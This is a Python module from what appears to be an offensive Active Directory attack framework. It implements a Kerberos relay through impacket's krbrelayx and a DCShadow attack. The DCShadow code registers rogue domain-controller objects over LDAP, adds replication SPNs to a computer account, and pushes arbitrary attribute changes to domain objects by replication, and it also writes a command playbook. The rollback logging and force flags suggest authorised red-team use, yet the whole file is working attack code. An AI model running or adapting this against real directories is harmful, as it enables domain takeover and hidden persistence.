"""Kerberos relay and DCShadow rogue-DC registration."""

from __future__ import annotations

import shutil
import subprocess
from typing import Any

from rich.console import Console

from adaf_attack.capabilities.capability_catalog import register_from_catalog
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_ops import (
    attr_value,
    finish,
    lookup_sam,
    register_advisory_rollback,
    register_object_rollback,
    require_force,
    require_param,
)
from adaf_attack.core.ldap_util import ldap_connect
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()


@register_from_catalog("krb-relay")
class KrbRelay:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("krb-relay", force)
        relay_targets = kwargs.get("relay_targets") or kwargs.get("target")
        if isinstance(relay_targets, str):
            relay_targets = [h.strip() for h in relay_targets.split(",") if h.strip()]
        if not relay_targets:
            raise RuntimeError("krb-relay requires -P relay_targets=<ldap://host or http://host>")
        duration = int(kwargs.get("duration_seconds") or 60)
        binary = shutil.which("impacket-krbrelayx") or shutil.which("krbrelayx.py")
        if not binary:
            raise RuntimeError(
                "impacket-krbrelayx not on PATH; krbrelayx is not shipped by the pinned "
                "impacket package. Vendor it from the dirkjanm/krbrelayx project and add "
                "its directory to PATH."
            )
        argv = [binary, "-t", str(relay_targets[0])]
        for extra in relay_targets[1:]:
            argv.extend(["-t", extra])
        log_file = session.path("krb-relay.log")
        with log_file.open("w", encoding="utf-8", newline="\n") as fp:
            proc = subprocess.Popen(
                argv, stdout=fp, stderr=subprocess.STDOUT, cwd=str(session.root)
            )
            try:
                proc.wait(timeout=duration)
                returncode = proc.returncode
                truncated = False
            except subprocess.TimeoutExpired:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                returncode = proc.returncode if proc.returncode is not None else -1
                truncated = True
        register_advisory_rollback(
            session,
            kind="krb-relay",
            target=",".join(str(t) for t in relay_targets),
            rollback="Review LDAP/HTTP writes performed over Kerberos relay and revert them.",
        )
        result = {
            "ok": returncode == 0 and not truncated,
            "status": "completed" if returncode == 0 and not truncated else "failed",
            "argv": argv,
            "return_code": returncode,
            "truncated": truncated,
            "relay_targets": relay_targets,
            "log": str(log_file),
        }
        for host in relay_targets:
            graph.add_edge(
                f"RELAY@{str(host).upper()}",
                f"DOMAIN@{target.domain.upper()}",
                "KrbRelayTarget",
            )
        return finish(session, graph, "krb-relay", result, ok=result["ok"])


@register_from_catalog("dcshadow")
class DcShadow:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("dcshadow", force)
        computer = require_param(kwargs, "computer", "sam")
        site = str(kwargs.get("site") or "Default-First-Site-Name")
        push_object = kwargs.get("object") or kwargs.get("object_dn") or kwargs.get("push_dn")
        push_attribute = kwargs.get("attribute") or kwargs.get("attr")
        push_value = kwargs.get("value")
        conn, base_dn, config_nc = ldap_connect(target)
        try:
            from ldap3 import MODIFY_ADD

            from adaf_attack.core.ldap_ops import attr_strings

            config = config_nc or f"CN=Configuration,{base_dn}"
            found = lookup_sam(
                conn,
                base_dn,
                computer,
                ["distinguishedName", "dNSHostName", "servicePrincipalName", "objectGUID"],
            )
            if not found:
                raise RuntimeError(f"Computer not found: {computer}")
            computer_dn, entry = found
            dns = str(attr_value(entry, "dNSHostName") or f"{computer.rstrip('$')}.{target.domain}")
            server_dn = f"CN={computer.rstrip('$')},CN=Servers,CN={site},CN=Sites,{config}"
            ntds_dn = f"CN=NTDS Settings,{server_dn}"
            server_ok = bool(
                conn.add(
                    server_dn,
                    attributes={
                        "objectClass": ["top", "server"],
                        "dNSHostName": dns,
                        "serverReference": computer_dn,
                    },
                )
            )
            ntds_ok = bool(
                conn.add(
                    ntds_dn,
                    attributes={
                        "objectClass": ["top", "applicationSettings", "nTDSDSA"],
                        "hasMasterNCs": [base_dn],
                        "options": 1,
                    },
                )
            )
            if server_ok:
                register_object_rollback(
                    session, target_dn=server_dn, rollback="Delete the rogue DC server object."
                )
            if ntds_ok:
                register_object_rollback(
                    session, target_dn=ntds_dn, rollback="Delete the rogue nTDSDSA object."
                )

            # Register replication SPNs on the planted computer account.
            spn_candidates = [
                f"GC/{dns}",
                f"E3514235-4B06-11D1-AB04-00C04FC2DCD2/{dns}",
                f"ldap/{dns}",
            ]
            existing = {s.lower() for s in attr_strings(entry, "servicePrincipalName")}
            to_add = [s for s in spn_candidates if s.lower() not in existing]
            spn_ok = True
            if to_add:
                spn_ok = bool(
                    conn.modify(computer_dn, {"servicePrincipalName": [(MODIFY_ADD, to_add)]})
                )
                if spn_ok:
                    from adaf_attack.core.ldap_ops import register_add_value_rollback

                    register_add_value_rollback(
                        session,
                        target_dn=computer_dn,
                        attribute="servicePrincipalName",
                        values=to_add,
                        rollback="Remove DCShadow replication SPNs from the computer account.",
                    )

            replication_push: dict[str, Any] = {
                "performed": False,
                "spns_added": to_add,
                "spn_ok": spn_ok,
            }
            if push_object and push_attribute is not None and push_value is not None:
                from adaf_attack.core.drs_addentry import add_entry_modify
                from adaf_attack.core.impacket_helper import ImpacketMissing

                try:
                    push = add_entry_modify(
                        target,
                        object_dn=str(push_object),
                        attribute=str(push_attribute),
                        value=push_value
                        if isinstance(push_value, bytes | str)
                        else str(push_value),
                    )
                    replication_push.update(push)
                    replication_push["performed"] = bool(push.get("ok"))
                    if push.get("ok"):
                        register_advisory_rollback(
                            session,
                            kind="dcshadow-push",
                            target=str(push_object),
                            rollback=(
                                f"Revert {push_attribute} on {push_object} pushed via DCShadow."
                            ),
                        )
                except ImpacketMissing as exc:
                    replication_push["error"] = str(exc)
                    replication_push["note"] = (
                        "Impacket required for IDL_DRSAddEntry; objects/SPNs prepared."
                    )
            else:
                replication_push["note"] = (
                    "Pass -P object=<dn> -P attribute=<name|oid> -P value=<data> to perform "
                    "IDL_DRSAddEntry after planting the rogue DC objects."
                )

            playbook = session.path("dcshadow-push.playbook.txt")
            playbook.write_text(
                "# DCShadow DRSUAPI push\n"
                f"# Server object: {server_dn}\n"
                f"# nTDSDSA object: {ntds_dn}\n"
                f"# SPNs added: {', '.join(to_add) or '(none — already present)'}\n"
                "# Native push: adaf-attack run dcshadow --force \\\n"
                f"#   -P computer={computer} -P object=<target-dn> "
                "-P attribute=<name> -P value=<data>\n",
                encoding="utf-8",
            )
            prepared = bool(server_ok and ntds_ok)
            pushed = bool(replication_push.get("performed"))
            push_requested = (
                push_object is not None and push_attribute is not None and push_value is not None
            )
            result = {
                "ok": (prepared and pushed) if push_requested else prepared,
                "status": ("pushed" if pushed else ("prepared" if prepared else "failed")),
                "server_dn": server_dn,
                "ntds_dn": ntds_dn,
                "server_ok": server_ok,
                "ntds_ok": ntds_ok,
                "replication_push": replication_push,
                "playbook": str(playbook),
                "ldap_result": str(conn.result),
            }
            console.print(
                f"[green]dcshadow[/green] server={server_ok} ntds={ntds_ok} "
                f"push={replication_push.get('performed')}"
            )
            return finish(session, graph, "dcshadow", result, ok=result["ok"])
        finally:
            conn.unbind()
